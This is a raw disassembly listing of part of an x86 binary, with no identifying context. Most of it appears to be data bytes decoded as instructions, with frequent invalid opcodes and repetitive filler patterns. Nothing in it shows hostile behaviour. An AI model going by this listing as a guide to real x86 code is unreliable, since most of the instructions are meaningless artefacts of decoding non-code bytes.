  42218f:	or     ch,BYTE PTR [ecx+0x7a]
  422192:	(bad)  
  422193:	lods   al,BYTE PTR ds:[esi]
  422194:	jmp    0xece4:0x9eb98081
  42219b:	xor    dl,BYTE PTR ds:0x3ed53446
  4221a1:	or     al,BYTE PTR [ebp+eiz*2+0x2e8da042]
  4221a8:	and    eax,0xd40bba34
  4221ad:	addr16 hlt 
  4221af:	push   eax
  4221b0:	xchg   edi,eax
  4221b1:	in     eax,0xe0
  4221b3:	(bad)  
  4221b4:	jnp    0x42213c
  4221b6:	or     esp,DWORD PTR [bx+si-0x4a]
  4221ba:	aaa    
  4221bb:	sti    
  4221bc:	rcr    DWORD PTR [edi],1
  4221be:	xor    al,0x0
  4221c0:	cld    
  4221c1:	out    0xc6,al
  4221c3:	sub    ebx,DWORD PTR [edi+0x39]
  4221c6:	push   ds
  4221c7:	lock jmp 0x78e033c6
  4221cd:	aam    0x5e
  4221cf:	mov    edi,0xbf3f49dc
  4221d4:	out    dx,eax
  4221d5:	pop    edx
  4221d6:	and    eax,0xed4986f3
  4221db:	inc    eax
  4221dc:	cmp    bh,BYTE PTR ds:0xafa84e7a
  4221e2:	adc    DWORD PTR [edi],edx
  4221e4:	jecxz  0x4221ed
  4221e6:	loopne 0x422217
  4221e8:	mov    eax,0x41cd000
  4221ed:	mov    ecx,0x60af3a2
  4221f2:	push   esp
  4221f3:	mov    BYTE PTR [edi*2-0x8f085c1],bh
  4221fa:	(bad)  
  4221fb:	(bad)  
  4221fc:	repnz icebp 
  4221fe:	add    BYTE PTR [ebx],cl
  422200:	add    BYTE PTR [ebp-0x242af072],dl
  422206:	mov    al,0x72
  422208:	mov    esi,0x1620974c
  42220d:	shl    BYTE PTR [eax-0xe1cd53f],cl
  422213:	repnz mov BYTE PTR [edi],al
  422216:	mov    esp,DWORD PTR [eax-0xd2e2a1d]
  42221c:	pop    eax
  42221d:	pop    esi
  42221e:	pop    esp
  42221f:	ss fmul st(0),st
  422222:	mov    cl,dl
  422224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422225:	xchg   BYTE PTR [eax-0x22],bl
  422228:	sbb    BYTE PTR [eax+0x24],ch
  42222b:	mov    ah,0x6
  42222d:	loopne 0x4221ba
  42222f:	in     eax,dx
  422230:	aam    0x70
  422232:	in     al,dx
  422233:	es aas 
  422235:	cmc    
  422236:	call   0x595511b0
  42223b:	fs aaa 
  42223d:	jp     0x422209
  42223f:	inc    ebx
  422240:	cmp    al,0x2e
  422242:	jmp    0x42228a
  422244:	fxtract 
  422246:	fimul  DWORD PTR [esi-0x6e]
  422249:	xchg   edi,eax
  42224a:	mov    esi,0xe1e55869
  42224f:	das    
  422250:	sub    esi,DWORD PTR [ebp-0x6f21578e]
  422256:	sub    DWORD PTR [eax-0x7486842f],0x99aa5900
  422260:	adc    eax,0x94c7476b
  422265:	shl    BYTE PTR [edx],0x12
  422268:	push   eax
  422269:	fisttp WORD PTR [ebx+0x10]
  42226c:	pushf  
  42226d:	dec    esi
  42226e:	ret    
  42226f:	cs add eax,0xdbe01285
  422275:	rcr    DWORD PTR [ecx+0x506c20e7],0x9d
  42227c:	add    al,0x9f
  42227e:	cmp    eax,0xeed7801b
  422283:	jne    0x422248
  422285:	in     al,dx
  422286:	icebp  
  422287:	(bad)  
  422288:	mov    esi,0xc5dc5f80
  42228d:	es inc ebx
  42228f:	mov    ah,0x97
  422291:	aaa    
  422292:	sbb    eax,0xf927f93e
  422297:	jge    0x422288
  422299:	mov    eax,0xc7f9f076
  42229e:	mov    edx,0x96ef5ff9
  4222a3:	sar    DWORD PTR [ebx+ebx*8-0x70d068ff],cl
  4222aa:	pop    ebp
  4222ab:	adc    BYTE PTR [esi+eax*8+0x4f],0x1e
  4222b0:	add    bh,BYTE PTR [ecx]
  4222b2:	jmp    0x4222fa
  4222b4:	in     eax,0xea
  4222b6:	test   BYTE PTR [edx-0x537aa319],bl
  4222bc:	xchg   DWORD PTR ds:0xe71a5426,edi
  4222c2:	and    eax,0xc82d6f57
  4222c7:	scas   eax,DWORD PTR es:[edi]
  4222c8:	push   ds
  4222c9:	push   edi
  4222ca:	jmp    0x8b103d89
  4222cf:	imul   DWORD PTR [esi]
  4222d1:	lock inc ebx
  4222d3:	inc    esp
  4222d4:	stc    
  4222d5:	scas   al,BYTE PTR es:[edi]
  4222d6:	add    BYTE PTR [edi+0x3],ah
  4222d9:	test   eax,0x8459567d
  4222de:	push   edx
  4222df:	push   0xeca52e35
  4222e4:	jmp    0xa418:0x2ceb9be5
  4222eb:	lods   al,BYTE PTR ds:[esi]
  4222ec:	mov    ds:0xe516438,al
  4222f1:	nop
  4222f2:	mov    eax,ds:0xb34243ce
  4222f7:	adc    esi,DWORD PTR [ecx-0x1169110f]
  4222fd:	fs mov esi,0xd7821aca
  422303:	jecxz  0x42228f
  422305:	mov    ebp,0xb42f5201
  42230a:	gs jne 0x422346
  42230d:	mov    BYTE PTR [eax-0x47],ah
  422310:	add    esi,DWORD PTR [eax-0x1fdd095f]
  422316:	(bad)  
  422317:	dec    eax
  422318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422319:	push   ds
  42231a:	lea    esp,[ecx-0x59]
  42231d:	add    BYTE PTR [ebx+0xa],0xc6
  422321:	sub    dh,BYTE PTR [ebx-0x4a]
  422324:	scas   eax,DWORD PTR es:[edi]
  422325:	mov    ah,0x55
  422327:	rcr    DWORD PTR [eax+0x6deaf6d2],cl
  42232d:	and    edx,DWORD PTR [ebx]
  42232f:	fwait
  422330:	add    bl,BYTE PTR [edi-0x6a]
  422333:	mov    cl,0x48
  422335:	fist   DWORD PTR [edx-0x62]
  422338:	sub    al,0xfa
  42233a:	and    BYTE PTR [ebp-0x54],ch
  42233d:	sub    al,0x54
  42233f:	mov    dl,0x1f
  422341:	(bad)  [edi+0x30]
  422344:	mov    al,ds:0xa4107294
  422349:	sbb    bl,dl
  42234b:	outs   dx,DWORD PTR ds:[esi]
  42234c:	in     al,dx
  42234d:	clc    
  42234e:	xor    DWORD PTR fs:[edx-0x1],edi
  422352:	add    eax,eax
  422354:	cld    
  422355:	ds jo  0x4223d2
  422358:	or     al,0x9c
  42235a:	int    0x66
  42235c:	js     0x422343
  42235e:	jbe    0x422319
  422360:	(bad)  
  422361:	jmp    0x422340
  422363:	daa    
  422364:	aas    
  422365:	repz dec edi
  422367:	push   esi
  422369:	loop   0x422342
  42236b:	mov    al,0xe1
  42236d:	mov    al,0x71
  42236f:	add    BYTE PTR [eax],al
  422371:	sub    BYTE PTR [edi],0xfe
  422374:	std    
  422375:	fbld   TBYTE PTR [esi-0x50702a1]
  42237b:	xchg   edi,esi
  42237d:	imul   DWORD PTR [edi-0x24251f83]
  422383:	push   cs
  422384:	sahf   
  422385:	js     0x422368
  422387:	pop    es
  422388:	fistp  QWORD PTR [eax-0x56]
  42238b:	sbb    al,0xf5
  42238d:	push   edi
  42238e:	scas   eax,DWORD PTR es:[edi]
  42238f:	mov    esi,0xcb07adf5
  422394:	stc    
  422395:	mov    ebp,0xb8f2d247
  42239a:	out    dx,eax
  42239b:	cs pusha 
  42239d:	(bad)  
  42239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42239f:	rcr    ebp,cl
  4223a1:	mov    dl,0x2c
  4223a3:	jge    0x4223a7
  4223a5:	shl    BYTE PTR [edi-0x5c],1
  4223a8:	popa   
  4223a9:	inc    eax
  4223aa:	mov    dl,0x81
  4223ac:	mov    esp,0xbb909094
  4223b1:	retf   
  4223b2:	test   eax,0x2943194b
  4223b7:	sbb    BYTE PTR [edx+0x64ba08eb],cl
  4223bd:	cli    
  4223be:	call   0xff0a8f61
  4223c3:	mov    ch,BYTE PTR [ebx-0x45]
  4223c6:	into   
  4223c7:	push   edi
  4223c8:	fs repz mov esp,0x600f4cb9
  4223cf:	sub    eax,0x5911e5d8
  4223d4:	pop    ebp
  4223d5:	adc    dh,dl
  4223d7:	jb     0x422425
  4223d9:	xchg   esi,ebx
  4223db:	cmp    DWORD PTR [ebp+0x53],0xfffffff6
  4223df:	adc    DWORD PTR [ebx-0x678bbc80],0x65f64333
  4223e9:	test   eax,0xbfa9fa69
  4223ee:	xchg   esi,eax
  4223ef:	lea    esp,ss:[ebp+0x69]
  4223f3:	je     0x42242a
  4223f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223f6:	cli    
  4223f7:	dec    edx
  4223f8:	outs   dx,DWORD PTR ds:[esi]
  4223f9:	sub    cl,bh
  4223fb:	xchg   edx,eax
  4223fc:	inc    eax
  4223fd:	push   edi
  4223fe:	xchg   BYTE PTR [esi+ebx*2-0x4e1d3f41],ch
  422405:	sub    al,0x68
  422407:	retf   
  422408:	or     bh,BYTE PTR [ebx+0x350f79ef]
  42240e:	lods   eax,DWORD PTR ds:[esi]
  42240f:	(bad)  
  422410:	sub    BYTE PTR [ebx+0x15565de4],cl
  422416:	mov    ebp,0x845bf814
  42241b:	mov    ch,0xab
  42241d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42241e:	std    
  42241f:	push   0x5
  422421:	dec    edx
  422422:	cmc    
  422423:	(bad)  
  422424:	outs   dx,BYTE PTR ds:[esi]
  422425:	inc    eax
  422426:	int    0x67
  422428:	adc    ah,BYTE PTR [ebx]
  42242a:	sub    DWORD PTR [esi-0x72],ebx
  42242d:	mov    cl,0xa8
  42242f:	adc    eax,0xb2d79865
  422434:	mov    WORD PTR [ebp-0x6c],gs
  422437:	jae    0x4223e2
  422439:	jnp    0x42245d
  42243b:	xchg   esp,eax
  42243c:	xor    esp,DWORD PTR [edi-0x5a6c66b6]
  422442:	mov    eax,ds:0x160049f5
  422447:	inc    ebx
  422448:	icebp  
  422449:	neg    BYTE PTR [eax]
  42244b:	mov    bl,0x48
  42244d:	or     eax,0x171248c3
  422452:	nop
  422453:	mov    dh,0x45
  422455:	fld    TBYTE PTR [esi-0x524e6b5b]
  42245b:	add    BYTE PTR [ebx+esi*8+0x4c],ah
  42245f:	and    eax,0xfc643c71
  422464:	shl    DWORD PTR [ebp+0x60],1
  422467:	push   ecx
  422468:	push   eax
  422469:	adc    dh,BYTE PTR [edx+0x9c8596f]
  42246f:	pop    eax
  422470:	sub    al,0xd3
  422472:	nop
  422473:	lods   eax,DWORD PTR ds:[esi]
  422474:	mov    ds:0x549521cb,al
  422479:	out    dx,al
  42247a:	xchg   ebp,eax
  42247b:	xchg   edx,eax
  42247c:	into   
  42247d:	add    BYTE PTR [edx+esi*4-0x101ce7a8],0xd2
  422485:	mov    dl,0xeb
  422487:	ja     0x422418
  422489:	(bad)  
  42248a:	push   ds
  42248b:	loopne 0x4224f1
  42248d:	call   0x3cc97488
  422492:	cmp    edi,DWORD PTR [esp+edi*1]
  422495:	mov    esp,0x9f4fef71
  42249a:	jle    0x422496
  42249c:	mov    edi,0xeef2dff7
  4224a1:	xchg   edi,eax
  4224a2:	push   cs
  4224a3:	pop    edi
  4224a4:	std    
  4224a5:	(bad)
  4224a8:	lahf   
  4224a9:	sbb    al,0x7d
  4224ab:	sti    
  4224ac:	mov    bl,0xdf
  4224ae:	fnsave [eax+0x6d86dfeb]
  4224b4:	fadd   DWORD PTR [esi+0x6d86d86d]
  4224ba:	fadd   DWORD PTR [esi+0x6d86d86d]
  4224c0:	fadd   DWORD PTR [esi+0x6d86d86d]
  4224c6:	fadd   DWORD PTR [esi+0x6d86d86d]
  4224cc:	fadd   DWORD PTR [esi+0x7ff08e3f]
  4224d2:	lahf   
  4224d3:	std    
  4224d4:	push   ebp
  4224d5:	inc    esp
  4224d6:	cs pop edx
  4224d8:	adc    bh,BYTE PTR [edi+0x0]
  4224db:	add    BYTE PTR [eax],al
  4224dd:	add    BYTE PTR [ecx+0x45],cl
  4224e0:	dec    esi
  4224e1:	inc    esp
  4224e2:	scas   al,BYTE PTR es:[edi]
  4224e3:	inc    edx
  4224e4:	pusha  
  4224e5:	add    BYTE PTR [eax],0x0
  4224e8:	sub    BYTE PTR [eax],al
  4224ea:	add    BYTE PTR [eax],al
  4224ec:	xor    BYTE PTR [eax],al
  4224ee:	add    BYTE PTR [eax],al
  4224f0:	pusha  
  4224f1:	add    BYTE PTR [eax],al
  4224f3:	add    BYTE PTR [ecx],al
  4224f5:	add    BYTE PTR [eax],ah
  4224f7:	add    BYTE PTR [eax],al
  4224f9:	add    BYTE PTR [eax],al
  4224fb:	add    BYTE PTR [eax+0x25],al
	...
  4225dd:	add    BYTE PTR [eax],al
  4225df:	add    BYTE PTR [ebx+eax*2],bl
  4225e2:	mov    DWORD PTR [eax+0x13],edx
  4225e5:	cmp    eax,0x3805899b
  4225ea:	pushf  
  4225eb:	xchg   ebx,eax
  4225ec:	add    BYTE PTR [edx],dh
  4225ee:	fwait
  4225ef:	xchg   esi,eax
  4225f0:	add    BYTE PTR [edx],dh
  4225f2:	pushf  
  4225f3:	cwde   
  4225f4:	or     edi,DWORD PTR [edi]
  4225f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f7:	cwde   
  4225f8:	sbb    ecx,DWORD PTR [edi-0x4f]
  4225fb:	cdq    
  4225fc:	sbb    DWORD PTR [esi-0x4e],ecx
  4225ff:	cdq    
  422600:	sbb    DWORD PTR [esi-0x4f],ecx
  422603:	cdq    
  422604:	sbb    DWORD PTR [edi-0x4e],ecx
  422607:	cdq    
  422608:	sbb    DWORD PTR [eax-0x4d],edx
  42260b:	cdq    
  42260c:	sbb    dl,BYTE PTR [eax-0x4c]
  42260f:	cdq    
  422610:	sbb    DWORD PTR [ecx-0x4c],edx
  422613:	cdq    
  422614:	sbb    DWORD PTR [ecx-0x4c],edx
  422617:	cdq    
  422618:	sbb    dl,BYTE PTR [ecx-0x4b]
  42261b:	cdq    
  42261c:	sbb    BYTE PTR [edi-0x4c],cl
  42261f:	cdq    
  422620:	push   ss
  422621:	dec    edi
  422622:	mov    ch,0x9a
  422624:	push   ss
  422625:	dec    edi
  422626:	mov    ch,0x9a
  422628:	push   ss
  422629:	push   eax
  42262a:	mov    ch,0x9a
  42262c:	push   ss
  42262d:	dec    edi
  42262e:	mov    ch,0x9a
  422630:	push   ss
  422631:	push   eax
  422632:	mov    ch,0x9a
  422634:	push   ss
  422635:	push   eax
  422636:	mov    ch,0x9a
  422638:	push   ss
  422639:	push   eax
  42263a:	mov    ch,0x9a
  42263c:	push   ss
  42263d:	push   eax
  42263e:	mov    dh,0x9a
  422640:	push   ss
  422641:	push   eax
  422642:	mov    dh,0x9a
  422644:	push   ss
  422645:	push   ecx
  422646:	mov    dh,0x9a
  422648:	pop    ss
  422649:	push   ecx
  42264a:	mov    bh,0x9a
  42264c:	push   ss
  42264d:	push   ecx
  42264e:	mov    bh,0x9a
  422650:	push   ss
  422651:	push   ecx
  422652:	mov    eax,0xb751179a
  422657:	call   0x5217:0x9ab85217
  42265e:	mov    ecx,0xb851179a
  422663:	call   0x5118:0x9ab65017
  42266a:	mov    dh,0x9a
  42266c:	push   ss
  42266d:	dec    esi
  42266e:	mov    bl,0x99
  422670:	add    BYTE PTR [edi],dh
  422672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422673:	xchg   edi,eax
  422674:	add    eax,0x1693a63e
  422679:	inc    esp
  42267a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267b:	mov    BYTE PTR [ecx],ch
  42267d:	dec    edi
  42267e:	(bad)  
  42267f:	aas    
	...
  4226a0:	add    BYTE PTR [eax-0x3b],ah
  4226a3:	jmp    0x67ca8
  4226a8:	add    BYTE PTR [eax-0x3b],bl
  4226ab:	inc    DWORD PTR [eax]
  4226ad:	pop    eax
  4226ae:	(bad)  
  4226b1:	pop    eax
  4226b2:	(bad)  
  4226b5:	pop    eax
  4226b6:	(bad)  
  4226b9:	pop    eax
  4226ba:	(bad)  
  4226bd:	pop    ecx
  4226be:	(bad)  
  4226c1:	pop    ecx
  4226c2:	(bad)  
  4226c5:	pop    ecx
  4226c6:	(bad)  
  4226c9:	pop    ecx
  4226ca:	(bad)  
  4226cd:	pop    edx
  4226ce:	(bad)  
  4226d1:	pop    edx
  4226d2:	(bad)  
  4226d5:	pop    edx
  4226d6:	(bad)  
  4226d9:	pop    edx
  4226da:	(bad)  
  4226dd:	pop    edx
  4226de:	(bad)  
  4226df:	inc    DWORD PTR [eax]
  4226e1:	pop    edx
  4226e2:	(bad)  
  4226e3:	inc    DWORD PTR [eax]
  4226e5:	pop    edx
  4226e6:	(bad)  
  4226e7:	inc    DWORD PTR [eax]
  4226e9:	pop    edx
  4226ea:	(bad)  
  4226eb:	inc    DWORD PTR [eax]
  4226ed:	pop    ebx
  4226ee:	(bad)  
  4226ef:	inc    DWORD PTR [eax]
  4226f1:	pop    ebx
  4226f2:	(bad)  
  4226f3:	inc    DWORD PTR [eax]
  4226f5:	pop    ebx
  4226f6:	(bad)  
  4226f7:	inc    DWORD PTR [eax]
  4226f9:	pop    ebx
  4226fa:	(bad)  
  4226fb:	inc    DWORD PTR [eax]
  4226fd:	pop    ebx
  4226fe:	(bad)  
  4226ff:	inc    DWORD PTR [eax]
  422701:	pop    ebx
  422702:	(bad)  
  422703:	inc    DWORD PTR [eax]
  422705:	pop    ebx
  422706:	(bad)  
  422707:	inc    DWORD PTR [eax]
  422709:	pop    ebx
  42270a:	(bad)  
  42270b:	inc    DWORD PTR [eax]
  42270d:	pop    ebx
  42270e:	(bad)  
  42270f:	inc    DWORD PTR [eax]
  422711:	pop    ebx
  422712:	(bad)  
  422713:	inc    DWORD PTR [eax]
  422715:	pop    ebx
  422716:	(bad)  
  422717:	inc    DWORD PTR [eax]
  422719:	pop    ebx
  42271a:	(bad)  
  42271b:	inc    DWORD PTR [eax]
  42271d:	pop    ebx
  42271e:	(bad)  
  42271f:	inc    DWORD PTR [eax]
  422721:	pop    ebx
  422722:	(bad)  
  422723:	inc    DWORD PTR [eax]
  422725:	pop    ebx
  422726:	(bad)  
  422727:	inc    DWORD PTR [eax]
  422729:	pop    ebx
  42272a:	(bad)  
  42272b:	inc    DWORD PTR [eax]
  42272d:	pop    ebx
  42272e:	(bad)  
  42272f:	inc    DWORD PTR [eax]
  422731:	pop    ebx
  422732:	(bad)  
  422733:	inc    DWORD PTR [eax]
  422735:	pop    ebx
  422736:	(bad)  
  422737:	inc    DWORD PTR [eax]
  422739:	pop    ebx
  42273a:	(bad)  
  42273d:	pop    edi
  42273e:	mov    ebp,0xd4
	...
  42275f:	add    BYTE PTR ds:0x38d3f9a8,cl
  422765:	enter  0xffff,0x38
  422769:	(bad)  
  42276a:	(bad)  
  42276b:	(bad)  
  42276c:	cmp    dh,al
  42276e:	(bad)  
  42276f:	(bad)  
  422770:	cmp    ch,al
  422772:	(bad)  
  422773:	(bad)  
  422774:	cmp    ch,al
  422776:	(bad)  
  422777:	(bad)  
  422778:	cmp    bh,al
  42277a:	(bad)  
  42277b:	(bad)  
  42277c:	cmp    dl,cl
  42277e:	(bad)  
  42277f:	(bad)  
  422780:	cmp    al,cl
  422782:	(bad)  
  422783:	(bad)  
  422784:	cmp    al,cl
  422786:	(bad)  
  422787:	(bad)  
  422788:	cmp    ah,al
  42278a:	(bad)  
  42278b:	(bad)  
  42278c:	cmp    BYTE PTR [ebp-0x45c70001],bh
  422792:	(bad)  
  422793:	(bad)  
  422794:	cmp    BYTE PTR [ecx-0x47c70001],bh
  42279a:	(bad)  
  42279b:	(bad)  
  42279c:	cmp    BYTE PTR [eax-0x48c70001],bh
  4227a2:	(bad)  
  4227a3:	(bad)  
  4227a4:	cmp    BYTE PTR [edi-0x48c70001],dh
  4227aa:	(bad)  
  4227ab:	(bad)  
  4227ac:	cmp    BYTE PTR [edi-0x48c70001],dh
  4227b2:	(bad)  
  4227b3:	(bad)  
  4227b4:	cmp    BYTE PTR [eax-0x47c70001],bh
  4227ba:	(bad)  
  4227bb:	(bad)  
  4227bc:	cmp    BYTE PTR [eax-0x46c70001],bh
  4227c2:	(bad)  
  4227c3:	(bad)  
  4227c4:	cmp    BYTE PTR [edx-0x45c70001],bh
  4227ca:	(bad)  
  4227cb:	(bad)  
  4227cc:	cmp    BYTE PTR [ebp-0x3ec70001],bh
  4227d2:	(bad)  
  4227d3:	(bad)  
  4227d4:	cmp    al,cl
  4227d6:	(bad)  
  4227d7:	(bad)  
  4227d8:	cmp    bl,cl
  4227da:	(bad)  
  4227db:	(bad)  
  4227dc:	cmp    bl,cl
  4227de:	(bad)  
  4227df:	(bad)  
  4227e0:	cmp    bl,cl
  4227e2:	(bad)  
  4227e3:	(bad)  
  4227e4:	cmp    ah,cl
  4227e6:	(bad)  
  4227e7:	(bad)  
  4227e8:	cmp    ah,cl
  4227ea:	(bad)  
  4227eb:	(bad)  
  4227ec:	cmp    ah,cl
  4227ee:	(bad)  
  4227ef:	(bad)  
  4227f0:	cmp    ch,cl
  4227f2:	(bad)  
  4227f3:	(bad)  
  4227f4:	cmp    bh,cl
  4227f6:	(bad)  
  4227f7:	(bad)  
  4227f8:	cmp    dh,dl
  4227fa:	(bad)  
  4227fb:	call   DWORD PTR [edx]
  4227fd:	stos   BYTE PTR es:[edi],al
  4227fe:	out    dx,eax
  4227ff:	mov    ebx,0x0
	...
  422820:	aas    
  422821:	mov    edx,0xad0097f9
  422826:	(bad)  
  422827:	inc    DWORD PTR [eax]
  422829:	scas   al,BYTE PTR es:[edi]
  42282a:	(bad)  
  42282b:	inc    DWORD PTR [eax]
  42282d:	stos   DWORD PTR es:[edi],eax
  42282e:	(bad)  
  42282f:	inc    DWORD PTR [eax]
  422831:	test   eax,0xa900ffff
  422836:	(bad)  
  422837:	inc    DWORD PTR [eax]
  422839:	stos   BYTE PTR es:[edi],al
  42283a:	(bad)  
  42283b:	inc    DWORD PTR [eax]
  42283d:	stos   DWORD PTR es:[edi],eax
  42283e:	(bad)  
  42283f:	inc    DWORD PTR [eax]
  422841:	stos   DWORD PTR es:[edi],eax
  422842:	(bad)  
  422843:	inc    DWORD PTR [eax]
  422845:	mov    ds:0x8e00fffe,eax
  42284a:	sti    
  42284b:	inc    DWORD PTR [eax]
  42284d:	mov    bh,bl
  42284f:	inc    DWORD PTR [eax]
  422851:	mov    bh,bl
  422853:	inc    DWORD PTR [eax]
  422855:	mov    edi,ebx
  422857:	inc    DWORD PTR [eax]
  422859:	mov    ebx,?
  42285b:	inc    DWORD PTR [eax]
  42285d:	(bad)  
  42285e:	sti    
  42285f:	inc    DWORD PTR [eax]
  422861:	mov    ebx,?
  422863:	inc    DWORD PTR [eax]
  422865:	mov    ebx,?
  422867:	inc    DWORD PTR [eax]
  422869:	(bad)  
  42286a:	cld    
  42286b:	inc    DWORD PTR [eax]
  42286d:	(bad)  
  42286e:	sti    
  42286f:	inc    DWORD PTR [eax]
  422871:	(bad)  
  422872:	sti    
  422873:	inc    DWORD PTR [eax]
  422875:	(bad)  
  422876:	sti    
  422877:	inc    DWORD PTR [eax]
  422879:	(bad)  
  42287a:	sti    
  42287b:	inc    DWORD PTR [eax]
  42287d:	(bad)  
  42287e:	sti    
  42287f:	inc    DWORD PTR [eax]
  422881:	(bad)  
  422882:	sti    
  422883:	inc    DWORD PTR [eax]
  422885:	mov    ?,ebx
  422887:	inc    DWORD PTR [eax]
  422889:	mov    ?,ebx
  42288b:	inc    DWORD PTR [eax]
  42288d:	(bad)  
  42288e:	sti    
  42288f:	inc    DWORD PTR [eax]
  422891:	mov    ?,ebx
  422893:	inc    DWORD PTR [eax]
  422895:	xchg   ebx,eax
  422896:	sti    
  422897:	inc    DWORD PTR [eax]
  422899:	test   eax,0xaf00fffe
  42289e:	(bad)  
  42289f:	inc    DWORD PTR [eax]
  4228a1:	scas   eax,DWORD PTR es:[edi]
  4228a2:	(bad)  
  4228a3:	inc    DWORD PTR [eax]
  4228a5:	mov    al,0xff
  4228a7:	inc    DWORD PTR [eax]
  4228a9:	mov    cl,0xff
  4228ab:	inc    DWORD PTR [eax]
  4228ad:	mov    dl,0xff
  4228af:	inc    DWORD PTR [eax]
  4228b1:	mov    ah,0xff
  4228b3:	inc    DWORD PTR [eax]
  4228b5:	mov    dh,0xff
  4228b7:	inc    DWORD PTR [eax]
  4228b9:	mov    eax,0xcc57ffff
  4228be:	sti    
  4228bf:	je     0x4228c1
	...
  4228dd:	add    BYTE PTR [eax],al
  4228df:	add    BYTE PTR [esi+edi*4-0xd],ah
  4228e3:	push   ecx
  4228e4:	add    BYTE PTR [ebx-0x5aff0003],ah
  4228ea:	(bad)  
  4228eb:	inc    DWORD PTR [eax]
  4228ed:	mov    eax,ds:0x9f00fffd
  4228f2:	cld    
  4228f3:	inc    DWORD PTR [eax]
  4228f5:	sahf   
  4228f6:	cld    
  4228f7:	inc    DWORD PTR [eax]
  4228f9:	lahf   
  4228fa:	cld    
  4228fb:	inc    DWORD PTR [eax]
  4228fd:	mov    eax,ds:0xa100fffd
  422902:	std    
  422903:	inc    DWORD PTR [eax]
  422905:	mov    ecx,?
  422907:	inc    DWORD PTR [eax]
  422909:	cmp    eax,0xffffffff
  42290c:	add    BYTE PTR [esi-0x76ff0006],al
  422912:	sti    
  422913:	inc    DWORD PTR [eax]
  422915:	mov    edi,esp
  422917:	inc    DWORD PTR [eax]
  422919:	mov    ?,ebp
  42291b:	inc    DWORD PTR [eax]
  42291d:	nop
  42291e:	(bad)  
  42291f:	inc    DWORD PTR [eax]
  422921:	xchg   ecx,eax
  422922:	(bad)  
  422923:	inc    DWORD PTR [eax]
  422925:	nop
  422926:	(bad)  
  422927:	inc    DWORD PTR [eax]
  422929:	mov    ?,esi
  42292b:	inc    DWORD PTR [eax]
  42292d:	mov    ?,esi
  42292f:	inc    DWORD PTR [eax]
  422931:	mov    ?,esi
  422933:	inc    DWORD PTR [eax]
  422935:	(bad)  
  422936:	(bad)  
  422937:	inc    DWORD PTR [eax]
  422939:	nop
  42293a:	(bad)  
  42293b:	inc    DWORD PTR [eax]
  42293d:	xchg   ecx,eax
  42293e:	(bad)  
  42293f:	inc    DWORD PTR [eax]
  422941:	xchg   ecx,eax
  422942:	(bad)  
  422943:	inc    DWORD PTR [eax]
  422945:	nop
  422946:	std    
  422947:	inc    DWORD PTR [eax]
  422949:	mov    esp,?
  42294b:	inc    DWORD PTR [eax]
  42294d:	mov    ebx,edi
  42294f:	inc    DWORD PTR [eax]
  422951:	mov    cl,bh
  422953:	inc    DWORD PTR [eax]
  422955:	xchg   cl,bh
  422957:	inc    DWORD PTR [eax]
  422959:	xchg   edx,eax
  42295a:	sti    
  42295b:	inc    DWORD PTR [eax]
  42295d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42295e:	(bad)  
  42295f:	inc    DWORD PTR [eax]
  422961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422962:	std    
  422963:	inc    DWORD PTR [eax]
  422965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422966:	std    
  422967:	inc    DWORD PTR [eax]
  422969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42296a:	std    
  42296b:	inc    DWORD PTR [eax]
  42296d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296e:	(bad)  
  42296f:	inc    DWORD PTR [eax]
  422971:	stos   BYTE PTR es:[edi],al
  422972:	(bad)  
  422973:	inc    DWORD PTR [eax]
  422975:	mov    cl,0xff
  422977:	inc    DWORD PTR [edx]
  422979:	mov    ch,0xfe
  42297b:	sti    
  42297c:	test   esp,edx
  42297e:	imul   DWORD PTR [ebx]
	...
  4229a0:	xchg   eax,ecx
  4229a2:	out    dx,eax
  4229a3:	adc    DWORD PTR [ebx],ecx
  4229a5:	mov    al,ds:0x9d00eaf9
  4229aa:	cld    
  4229ab:	inc    DWORD PTR [eax]
  4229ad:	cdq    
  4229ae:	sti    
  4229af:	inc    DWORD PTR [eax]
  4229b1:	xchg   edi,eax
  4229b2:	cli    
  4229b3:	inc    DWORD PTR [eax]
  4229b5:	xchg   esi,eax
  4229b6:	cli    
  4229b7:	inc    DWORD PTR [eax]
  4229b9:	cwde   
  4229ba:	cli    
  4229bb:	inc    DWORD PTR [eax]
  4229bd:	call   0xfffa:0x9200fffb
  4229c4:	add    BYTE PTR [esi-0xa],bh
  4229c7:	inc    DWORD PTR [eax]
  4229c9:	xchg   ecx,edi
  4229cb:	inc    DWORD PTR [eax]
  4229cd:	mov    bh,bl
  4229cf:	inc    DWORD PTR [eax]
  4229d1:	mov    esp,edi
  4229d3:	inc    DWORD PTR [eax]
  4229d5:	xchg   ebp,edi
  4229d7:	inc    DWORD PTR [eax]
  4229d9:	cmp    bl,0xff
  4229dc:	add    BYTE PTR [ecx+edi*8-0x1],bh
  4229e0:	add    BYTE PTR [esi-0xa],dh
  4229e3:	inc    DWORD PTR [eax]
  4229e5:	jb     0x4229db
  4229e7:	inc    DWORD PTR [eax]
  4229e9:	outs   dx,DWORD PTR ds:[esi]
  4229ea:	repnz inc DWORD PTR [eax]
  4229ed:	outs   dx,BYTE PTR ds:[esi]
  4229ee:	icebp  
  4229ef:	inc    DWORD PTR [eax]
  4229f1:	jo     0x4229e5
  4229f3:	inc    DWORD PTR [eax]
  4229f5:	jbe    0x4229eb
  4229f7:	inc    DWORD PTR [eax]
  4229f9:	jns    0x4229f1
  4229fb:	inc    DWORD PTR [eax]
  4229fd:	cmp    cl,0xff
  422a00:	add    BYTE PTR [edx-0x6fff0004],cl
  422a06:	std    
  422a07:	inc    DWORD PTR [eax]
  422a09:	nop
  422a0a:	(bad)  
  422a0b:	inc    DWORD PTR [eax]
  422a0d:	nop
  422a0e:	std    
  422a0f:	inc    DWORD PTR [eax]
  422a11:	xchg   ecx,eax
  422a12:	cld    
